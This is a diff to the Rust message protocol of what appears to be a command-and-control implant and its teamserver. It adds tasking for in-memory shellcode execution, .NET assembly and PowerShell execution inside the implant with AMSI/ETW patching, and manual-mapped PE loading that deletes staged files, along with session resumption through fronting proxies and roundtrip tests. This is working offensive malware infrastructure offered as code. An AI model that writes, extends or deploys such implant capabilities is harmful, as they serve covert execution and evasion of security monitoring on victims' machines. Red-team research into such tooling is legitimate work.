@@ -21,6 +21,22 @@ pub mod task_kind {
     pub const SLEEP: u8 = 0x05;
     pub const MODULE: u8 = 0x06;
     pub const DRIVER: u8 = 0x07;
+    /// In-process shellcode execution — position-independent payload
+    /// blob copied to a private RX region and called on the session
+    /// thread (ABR-T022). Capped at 48 KB by the frame ceiling.
+    pub const EXEC: u8 = 0x08;
+    /// In-process .NET assembly execution through bare CLR hosting with
+    /// optional AMSI/ETW patching first (ABR-T024/T025). Same cap.
+    pub const EXECASM: u8 = 0x09;
+    /// In-process PowerShell execution: the teamserver compiles and
+    /// ships the bootstrap assembly, the implant patches AMSI/ETW and
+    /// runs the script inside its own CLR instance — no powershell.exe
+    /// (ABR-T024/T026).
+    pub const POWERSHELL: u8 = 0x0A;
+    /// In-memory native PE execution (.exe/.dll) through the user-mode
+    /// manual mapper with exit redirection (ABR-T027). `data` inline
+    /// (48 KB cap) or `path` of an uploaded stage deleted after load.
+    pub const RUNPE: u8 = 0x0B;
 }
 
 /// Sub-actions of the DRIVER task kind (ABR-T013/T014).
@@ -79,6 +95,10 @@ pub const ARCH_X64: u8 = 1;
 
 #[derive(Debug, Clone, PartialEq)]
 pub struct RegisterInfo {
+    /// Per-process session token: 0 on first contact, then reused on
+    /// every re-register so the teamserver can RESUME the same session
+    /// (id + queued tasks) when a fronting proxy drops the transport.
+    pub session_token: u64,
     pub hostname: String,
     pub username: String,
     pub domain: String,
@@ -120,6 +140,35 @@ pub enum TaskBody {
         service: String,
         source: String,
         drop_path: String,
+    },
+    /// In-process shellcode execution without a child process or a new
+    /// thread (ABR-T022).
+    Execute {
+        data: Vec<u8>,
+    },
+    /// Runs a .NET Framework assembly inside the implant via CLR
+    /// hosting: `public static int <method_name>(string)` in
+    /// `type_name` (ABR-T025); `patch` arms ABR-T024 first.
+    ExecuteAssembly {
+        data: Vec<u8>,
+        type_name: String,
+        method_name: String,
+        argument: String,
+        patch: u8,
+    },
+    /// Runs a PowerShell script in-process through the bootstrap
+    /// assembly carried in `bootstrap` (compiled from tools/psboot.cs
+    /// by the teamserver); ABR-T024 patches apply first (ABR-T026).
+    PowerShell {
+        script: String,
+        bootstrap: Vec<u8>,
+    },
+    /// Maps and runs a native x64 PE inside the implant (ABR-T027):
+    /// sections, DIR64 relocations, imports against live modules with
+    /// ExitProcess-class entries redirected to ExitThread.
+    RunPe {
+        data: Vec<u8>,
+        path: String,
     },
     Exit,
 }
@@ -250,6 +299,7 @@ impl Message {
         let mut buf = Vec::new();
         match self {
             Message::Register(info) => {
+                put_u64(&mut buf, info.session_token);
                 put_str(&mut buf, &info.hostname);
                 put_str(&mut buf, &info.username);
                 put_str(&mut buf, &info.domain);
@@ -299,6 +349,34 @@ impl Message {
                         put_str(&mut buf, source);
                         put_str(&mut buf, drop_path);
                     }
+                    TaskBody::Execute { data } => {
+                        put_u8(&mut buf, task_kind::EXEC);
+                        put_blob(&mut buf, data);
+                    }
+                    TaskBody::PowerShell { script, bootstrap } => {
+                        put_u8(&mut buf, task_kind::POWERSHELL);
+                        put_str(&mut buf, script);
+                        put_blob(&mut buf, bootstrap);
+                    }
+                    TaskBody::RunPe { data, path } => {
+                        put_u8(&mut buf, task_kind::RUNPE);
+                        put_blob(&mut buf, data);
+                        put_str(&mut buf, path);
+                    }
+                    TaskBody::ExecuteAssembly {
+                        data,
+                        type_name,
+                        method_name,
+                        argument,
+                        patch,
+                    } => {
+                        put_u8(&mut buf, task_kind::EXECASM);
+                        put_blob(&mut buf, data);
+                        put_str(&mut buf, type_name);
+                        put_str(&mut buf, method_name);
+                        put_str(&mut buf, argument);
+                        put_u8(&mut buf, *patch);
+                    }
                     TaskBody::Exit => {
                         put_u8(&mut buf, task_kind::EXIT);
                     }
@@ -338,6 +416,7 @@ impl Message {
         let mut r = Reader::new(data);
         Ok(match msg_type {
             msg::REGISTER => Message::Register(RegisterInfo {
+                session_token: r.u64()?,
                 hostname: r.string()?,
                 username: r.string()?,
                 domain: r.string()?,
@@ -371,6 +450,22 @@ impl Message {
                         service: r.string()?,
                         source: r.string()?,
                         drop_path: r.string()?,
+                    },
+                    task_kind::EXEC => TaskBody::Execute { data: r.blob()? },
+                    task_kind::POWERSHELL => TaskBody::PowerShell {
+                        script: r.string()?,
+                        bootstrap: r.blob()?,
+                    },
+                    task_kind::RUNPE => TaskBody::RunPe {
+                        data: r.blob()?,
+                        path: r.string()?,
+                    },
+                    task_kind::EXECASM => TaskBody::ExecuteAssembly {
+                        data: r.blob()?,
+                        type_name: r.string()?,
+                        method_name: r.string()?,
+                        argument: r.string()?,
+                        patch: r.u8()?,
                     },
                     task_kind::EXIT => TaskBody::Exit,
                     _ => {
@@ -446,6 +541,7 @@ mod tests {
             integrity_level: 2,
             os_build: "10.0.19045".into(),
             implant_version: "0.1.0".into(),
+            session_token: 0,
         }));
         roundtrip(Message::Task(Task {
             id: 7,
@@ -493,6 +589,36 @@ mod tests {
                 drop_path: String::new(),
             },
         }));
+        roundtrip(Message::Task(Task {
+            id: 13,
+            body: TaskBody::Execute {
+                data: vec![0xB8, 0x37, 0x13, 0x00, 0x00, 0xC3],
+            },
+        }));
+        roundtrip(Message::Task(Task {
+            id: 14,
+            body: TaskBody::ExecuteAssembly {
+                data: vec![0x4D, 0x5A],
+                type_name: "Prog".into(),
+                method_name: "Go".into(),
+                argument: "lab".into(),
+                patch: 1,
+            },
+        }));
+        roundtrip(Message::Task(Task {
+            id: 15,
+            body: TaskBody::PowerShell {
+                script: "Write-Output hi".into(),
+                bootstrap: vec![0x4D, 0x5A, 0x00, 0x01],
+            },
+        }));
+        roundtrip(Message::Task(Task {
+            id: 16,
+            body: TaskBody::RunPe {
+                data: Vec::new(),
+                path: "C:\\stage\\p.exe".into(),
+            },
+        }));
         roundtrip(Message::TaskResult(TaskResult {
             id: 7,
             status: STATUS_OK,
@@ -518,6 +644,7 @@ mod tests {
             integrity_level: 1,
             os_build: "b".into(),
             implant_version: "0".into(),
+            session_token: 42,
         })
         .encode();
         assert!(matches!(
